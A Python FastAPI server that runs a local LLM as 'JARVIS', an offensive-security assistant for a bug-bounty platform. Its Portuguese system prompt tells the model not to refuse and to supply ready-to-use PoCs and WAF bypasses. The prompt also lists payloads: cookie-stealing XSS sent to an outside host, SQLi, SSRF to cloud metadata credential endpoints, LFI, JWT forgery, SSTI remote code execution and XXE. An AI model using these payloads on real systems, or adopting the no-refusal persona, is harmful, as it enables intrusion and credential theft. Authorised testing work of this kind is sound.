#!/usr/bin/env python3
"""
JAVEONE · AI BRAIN v3.0
FastAPI — SSE streaming + Ollama + TTS + AVEONE integration
"""
import asyncio
import json
import logging
import os
import socket
import subprocess
from pathlib import Path
from typing import AsyncGenerator

import httpx
import uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse, StreamingResponse
from gtts import gTTS

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("javeone")

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

OLLAMA_URL   = os.getenv("OLLAMA_URL",   "http://localhost:11434")
OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "dolphin-llama3")
MAX_HISTORY  = int(os.getenv("MAX_HISTORY", "20"))
MAX_TOKENS   = int(os.getenv("MAX_TOKENS",  "600"))
DIR          = Path(__file__).parent


def find_free_port(candidates: list) -> int:
    for p in candidates:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("", p))
                return p
            except OSError:
                continue
    return candidates[0]


PORT = int(os.getenv("PORT", str(find_free_port([7777, 7000, 9000, 6060, 5500]))))


# ── System Prompt — AVEONE completo ────────────────────────────────────────
SYSTEM_PROMPT = """\
És o JARVIS — IA de pentesting integrada na AVEONE Bug Bounty Platform.
Conheces em profundidade todas as ferramentas e vulnerabilidades do arsenal AVEONE.

IDENTIDADE:
- Especialista técnico em cibersegurança ofensiva e bug bounty
- Direto, preciso — dás código e comandos prontos a usar, nunca teoria vaga
- Respondes em português europeu (PT-PT)
- Tom: profissional com atitude de hacker experiente
- Não recusas questões técnicas legítimas de segurança

FERRAMENTAS AVEONE QUE CONHECES:
• SOC Scanner PRO v5 — analisa URLs: portas abertas, security headers, TLS, DNS, CORS, WHOIS, WAF detection, path disclosure
• BruteStrike — força bruta web: 28 wordlists, CAPTCHA bypass (OCR + 2Captcha), WordPress XML-RPC, SSH/FTP/RDP
• AveHunter Extension — deteta CVEs em libs JS (jQuery, React, Angular, Lodash...), notificação automática
• SecretLens Extension — encontra tokens expostos em JS/JSON/CSS (JWT, AWS, Stripe, GitHub, Firebase, Supabase)
• SOC Scanner Extension — score 0-100, headers, cookies (Secure/HttpOnly/SameSite), CORS, DOM secrets

SCANNERS ESPECIALIZADOS AVEONE (15+ ferramentas):
• context_xss_scanner.py — XSS Context-Aware: canary único por param, deteta contexto (HTML comment/atributo/JS string), bypass WAF com %0A
• jwt_attacker.py — JWT Suite: brute-force HS256, alg:none bypass, RS256→HS256 key confusion, kid SQLi, kid path traversal
• lfi_scanner.py — LFI/Path Traversal: 50+ variações, URL/double-URL/null-byte/unicode encoding, /proc/self/environ, log poisoning
• xxe_scanner.py — XXE: clássico, blind OOB via HTTP/DNS callback, SVG/XLSX/DOCX upload, JSON→XML switching
• ssti_scanner.py — SSTI: 12 engines (Jinja2, Twig, Freemarker, Velocity, ERB, Mako, Smarty, Pebble), payloads de RCE por engine
• crlf_scanner.py — CRLF: \r\n em headers/path, Set-Cookie injection, Location redirect, marcador aleatório para confirmação
• graphql_scanner.py — GraphQL: introspection bypass, field suggestion, batch DoS, alias bombs, SQLi via args, CSRF, auth bypass
• cloud_scanner.py — Cloud: S3/GCS/Azure Blob/R2/Alibaba OSS, listagem pública, upload anónimo, Spring Actuator, admin panels
• host_header_scanner.py — Host Header: cache poisoning, password reset ATO, X-Forwarded-Host/X-Host manipulation
• broken_auth_tester.py — Auth: session fixation, weak session IDs, timing attacks, race conditions, logout sem invalidação
• tokenhunter.py — Token Hunter: crawl de JS/env/JSON, extrai JWT/AWS/Stripe/GitHub/Firebase de qualquer conteúdo
• verify_findings.py — Filtro: soft-404 check, validação de conteúdo, WAF block detection

VULNERABILIDADES E COMO RESPONDES:

XSS (Cross-Site Scripting):
- Reflected: <script>fetch('https://burp.co/'+document.cookie)</script>
- Stored: payload persistente, maior impacto
- DOM: manipulação de innerHTML, document.write, eval
- Bypass: <img src=x onerror=alert(1)>, <svg/onload=alert(1)>, javascript:alert(1)
- HttpOnly bypass: XSS→CSRF, XSS→keylogger, XSS→BeEF hook

SQL Injection:
- Detetado: ' OR '1'='1 / " OR "1"="1
- Extração: UNION SELECT, error-based, blind time-based (SLEEP/WAITFOR)
- Bypass WAF: comentários (/*!*/), encoding hex, commas via LIMIT/OFFSET
- Ferramentas: sqlmap -u URL --dbs --dump, manual para bypass WAF

SSRF (Server-Side Request Forgery):
- Targets: http://169.254.169.254 (AWS), http://metadata.google.internal (GCP)
- Bypass: http://127.0.0.1, http://[::1], http://0x7f000001, http://localtest.me
- Protocols: file://, dict://, gopher://, ftp://

IDOR (Insecure Direct Object Reference):
- Testa IDs sequenciais, UUIDs, hashes MD5
- Altera user_id/account_id em requests autenticados
- BOLA/BFLA em APIs REST e GraphQL

LFI / Path Traversal:
- ../../../../etc/passwd (Linux), ..\..\windows\win.ini (Windows)
- Wrappers PHP: php://filter/convert.base64-encode/resource=index.php
- Log poisoning: User-Agent malicioso → /var/log/apache2/access.log

JWT Attacks:
- alg:none — remove assinatura, aceita payload falso
- HS256 brute — usa hashcat mode 16500 com wordlist rockyou
- RS256→HS256 — key confusion com JWKS public key
- kid SQLi — ' UNION SELECT 'key'-- para injetar chave arbitrária

SSTI (Server-Side Template Injection):
- Jinja2: {{7*7}} → 49, {{config}}, {{''.__class__.__mro__[1].__subclasses__()}}
- Twig: {{7*'7'}} → 7777777
- RCE Jinja2: {{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}

XXE:
- Clássico: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
- Blind OOB: entidade externa para servidor controlado
- SVG: <svg><image href="php://filter/..."/></svg>

CLOUD:
- S3: aws s3 ls s3://bucket-name --no-sign-request
- SSRF→EC2: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
- Azure: curl http://169.254.169.254/metadata/instance?api-version=2021-02-01

COMPORTAMENTO PARA AVEONE FINDINGS:
Quando recebes um finding do scanner AVEONE:
1. Confirmas e explicas o impacto real (Low/Medium/High/Critical)
2. Dás PoC completo e funcional para reproduzir
3. Técnicas de bypass se houver WAF ou filtros
4. CVSS score estimado com justificação
5. Template de report profissional (título, impacto, reprodução, mitigação)
6. Ferramenta AVEONE recomendada para aprofundar\
"""

chat_history: list = []


# ── App ─────────────────────────────────────────────────────────────────────
app = FastAPI(title="JAVEONE AI BRAIN", version="3.0.0")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)


# ── Static ──────────────────────────────────────────────────────────────────
@app.get("/")
async def root():
    return FileResponse(str(DIR / "index.html"))


@app.get("/welcome.mp3")
async def welcome_audio():
    return FileResponse(str(DIR / "welcome.mp3"), media_type="audio/mpeg")


@app.get("/reply.mp3")
async def reply_audio():
    f = DIR / "reply.mp3"
    if f.exists():
        return FileResponse(str(f), media_type="audio/mpeg",
                            headers={"Cache-Control": "no-store"})
    return JSONResponse({"error": "not ready"}, status_code=404)


# ── Prompt builder ──────────────────────────────────────────────────────────
def build_prompt(messages: list) -> str:
    parts = []
    for m in messages:
        role, content = m["role"], m["content"]
        if role == "system":
            parts.append(f"SISTEMA: {content}\n")
        elif role == "user":
            parts.append(f"UTILIZADOR: {content}")
        elif role == "assistant":
            parts.append(f"JARVIS: {content}")
    return "\n".join(parts) + "\nJARVIS:"


# ── TTS (blocking → executor) ───────────────────────────────────────────────
def _tts_sync(text: str, out_path: str) -> bool:
    tmp_mp3 = "/tmp/_jr_base.mp3"
    tmp_wav = "/tmp/_jr_base.wav"
    tmp_fx  = "/tmp/_jr_fx.wav"
    try:
        gTTS(text[:200].split("\n")[0], lang="pt", slow=False).save(tmp_mp3)
        subprocess.run(["ffmpeg", "-i", tmp_mp3, tmp_wav, "-y"],
                       capture_output=True, check=True)
        subprocess.run(
            ["sox", tmp_wav, tmp_fx,
             "tempo", "1.2", "pitch", "-260",
             "chorus", "0.65", "0.85", "50", "0.4", "0.2", "2.0", "-s",
             "reverb", "35", "30", "55", "70", "0", "-2",
             "gain", "-5", "norm", "-1"],
            capture_output=True, check=True,
        )
        subprocess.run(
            ["ffmpeg", "-i", tmp_fx,
             "-codec:a", "libmp3lame", "-b:a", "128k", out_path, "-y"],
            capture_output=True, check=True,
        )
        return True
    except Exception as exc:
        log.warning(f"TTS error: {exc}")
        return False


async def generate_tts(text: str):
    out = str(DIR / "reply.mp3")
    loop = asyncio.get_event_loop()
    ok = await loop.run_in_executor(None, _tts_sync, text, out)
    return "/reply.mp3" if ok else None


# ── Streaming core ──────────────────────────────────────────────────────────
async def _stream_response(user_msg: str, model: str) -> StreamingResponse:
    """Shared streaming logic for /api/chat and /api/analyze."""
    chat_history.append({"role": "user", "content": user_msg})
    messages = [{"role": "system", "content": SYSTEM_PROMPT}] + chat_history[-MAX_HISTORY:]

    payload = {
        "model":  model,
        "prompt": build_prompt(messages),
        "stream": True,
        "options": {
            "temperature": 0.75,
            "num_predict": MAX_TOKENS,
            "stop": ["UTILIZADOR:", "SISTEMA:"],
        },
    }

    async def token_stream() -> AsyncGenerator:
        collected = []
        try:
            async with httpx.AsyncClient(timeout=300) as client:
                async with client.stream(
                    "POST", f"{OLLAMA_URL}/api/generate", json=payload
                ) as resp:
                    async for line in resp.aiter_lines():
                        if not line:
                            continue
                        try:
                            chunk = json.loads(line)
                        except json.JSONDecodeError:
                            continue

                        token = chunk.get("response", "")
                        if token:
                            collected.append(token)
                            yield f"data: {json.dumps({'token': token, 'done': False})}\n\n"

                        if chunk.get("done"):
                            full_reply = "".join(collected).strip()
                            chat_history.append({"role": "assistant", "content": full_reply})
                            audio_url = await generate_tts(full_reply)
                            yield f"data: {json.dumps({'token': '', 'done': True, 'audio_url': audio_url})}\n\n"
                            return

        except Exception as exc:
            log.error(f"Stream error: {exc}")
            if chat_history and chat_history[-1]["role"] == "user":
                chat_history.pop()
            yield f"data: {json.dumps({'token': f'[ERRO: {exc}]', 'done': True, 'audio_url': None})}\n\n"

    return StreamingResponse(
        token_stream(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


# ── Endpoints ───────────────────────────────────────────────────────────────
@app.post("/api/chat")
async def chat(request: Request):
    body     = await request.json()
    user_msg = body.get("message", "").strip()
    if not user_msg:
        return JSONResponse({"error": "mensagem vazia"}, status_code=400)
    model = body.get("model", OLLAMA_MODEL).strip() or OLLAMA_MODEL
    return await _stream_response(user_msg, model)


@app.post("/api/analyze")
async def analyze_vuln(request: Request):
    """Recebe um finding estruturado da AVEONE e analisa automaticamente."""
    body      = await request.json()
    vuln_type = body.get("vuln_type", "vulnerabilidade desconhecida")
    url       = body.get("url", "")
    payload   = body.get("payload", "")
    severity  = body.get("severity", "")
    context   = body.get("context", "")
    model     = body.get("model", OLLAMA_MODEL).strip() or OLLAMA_MODEL

    parts = [f"[AVEONE FINDING] {vuln_type} detetada pelo scanner AVEONE."]
    if url:      parts.append(f"URL alvo: {url}")
    if payload:  parts.append(f"Payload detetado: {payload}")
    if severity: parts.append(f"Severidade indicada: {severity}")
    if context:  parts.append(f"Contexto adicional: {context}")
    parts.append(
        "\nAnalisa esta vulnerabilidade:\n"
        "1. Confirma impacto real e explica o que um atacante pode fazer\n"
        "2. PoC completo e funcional para reproduzir\n"
        "3. Técnicas de bypass se houver WAF ou filtros\n"
        "4. CVSS score estimado com justificação\n"
        "5. Template de report para bug bounty (título, impacto, reprodução, mitigação)"
    )

    user_msg = "\n".join(parts)
    return await _stream_response(user_msg, model)


@app.get("/api/models")
async def list_models():
    try:
        async with httpx.AsyncClient(timeout=5) as client:
            r = await client.get(f"{OLLAMA_URL}/api/tags")
            models = [m["name"] for m in r.json().get("models", [])]
        return {"models": models}
    except Exception:
        return {"models": [OLLAMA_MODEL]}


@app.post("/api/clear")
async def clear_history():
    chat_history.clear()
    return {"ok": True}


@app.get("/health")
async def health():
    try:
        async with httpx.AsyncClient(timeout=3) as client:
            r      = await client.get(f"{OLLAMA_URL}/api/tags")
            models = [m["name"] for m in r.json().get("models", [])]
        ollama_ok = any(OLLAMA_MODEL in m for m in models)
    except Exception:
        ollama_ok = False
    return {
        "status": "online",
        "ollama": ollama_ok,
        "model":  OLLAMA_MODEL,
        "port":   PORT,
    }


# ── Entry point ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"""
  ╔══════════════════════════════════════════╗
  ║   JAVEONE · AI BRAIN v3.0                ║
  ║   http://localhost:{PORT:<5}                 ║
  ║   Modelo : {OLLAMA_MODEL:<30}║
  ╚══════════════════════════════════════════╝
""")
    uvicorn.run(
        "brain_server:app",
        host="0.0.0.0",
        port=PORT,
        reload=False,
        log_level="warning",
    )
